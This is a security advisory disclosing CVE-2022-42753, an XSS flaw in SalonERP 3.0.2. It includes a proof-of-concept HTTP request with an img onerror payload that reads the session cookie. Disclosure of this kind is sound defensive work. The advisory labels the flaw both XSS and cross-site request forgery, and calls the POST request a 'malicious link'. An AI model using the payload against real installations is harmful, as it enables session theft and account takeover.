---
slug: advisories/hardway/
title: SalonERP 3.0.2 - XSS to Account Takeover
authors: Carlos Bello
writer: cbello
codename: hardway
product: SalonERP 3.0.2 - XSS to Account Takeover
date: 2022-10-27 18:30 COT
cveid: CVE-2022-42753
severity: 8.8
description: SalonERP 3.0.2      -      XSS to Account Takeover
keywords: Fluid Attacks, Security, Vulnerabilities, Salon ERP, Account Takeover, XSS
banner: advisories-bg
advise: yes
template: advisory
---

## Summary

|                       |                                                                    |
| --------------------- | -------------------------------------------------------------------|
| **Name**              | SalonERP 3.0.2 - XSS to Account Takeover                           |
| **Code name**         | [Hardway](https://en.wikipedia.org/wiki/Hardway)                   |
| **Product**           | SalonERP                                                           |
| **Affected versions** | Version 3.0.2                                                      |
| **State**             | Public                                                             |
| **Release date**      | 2022-10-27                                                         |

## Vulnerability

|                       |                                                                                                                             |
| --------------------- | ----------------------------------------------------------------------------------------------------------------------------|
| **Kind**              | Cross-site request forgery                                                                                                  |
| **Rule**              | [007. Cross-site request forgery](https://docs.fluidattacks.com/criteria/vulnerabilities/007)                               |
| **Remote**            | Yes                                                                                                                         |
| **CVSSv3 Vector**     | CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H                                                                                |
| **CVSSv3 Base Score** | 8.8                                                                                                                         |
| **Exploit available** | Yes                                                                                                                         |
| **CVE ID(s)**         | [CVE-2022-42753](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-42753)                                             |

## Description

SalonERP version 3.0.2 allows an external attacker to steal the cookie
of arbitrary users. This is possible because the application does not
correctly validate the page parameter against XSS attacks.

## Vulnerability

The XSS present in SalonERP 3.0.2, allows an unauthenticated remote
attacker to perform an Account Takeover. To trigger this vulnerability,
we will need to send the following malicious link to an victim in order
to hack their account:

```txt
POST /try/backend.php HTTP/2
Host: salonerp.sourceforge.io
Cookie: salonerp-id=EnznqgZ8cAX2N7stbSLl; PHPSESSID=2f8c90c0e918726eed019427af65f438
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Origin: https://hacker.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 61

what=settings<img+src=1+onerror="(alert)(document.cookie)" />
```

## Exploitation

In this attack we will obtain the victim user account, through a malicious
link.

![xss-to-accounttakeover-salonerp](https://user-images.githubusercontent.com/51862990/198411956-e65c8e7c-4e48-420b-abd5-51b4f0214716.gif)

## Our security policy

We have reserved the CVE-2022-42753 to refer to these issues from now on.

* https://fluidattacks.com/advisories/policy/

## System Information

* Version: SalonERP 3.0.2

* Operating System: GNU/Linux

## Mitigation

There is currently no patch available for this vulnerability.

## Credits

The vulnerability was discovered by [Carlos
Bello](https://www.linkedin.com/in/carlos-andres-bello) from Fluid Attacks'
Offensive Team.

## References

**Vendor page** <https://salonerp.sourceforge.io/>

## Timeline

<time-lapse
  discovered="2022-10-13"
  contacted="2022-10-13"
  replied="2022-10-13"
  confirmed=""
  patched=""
  disclosure="2022-10-27">
</time-lapse>
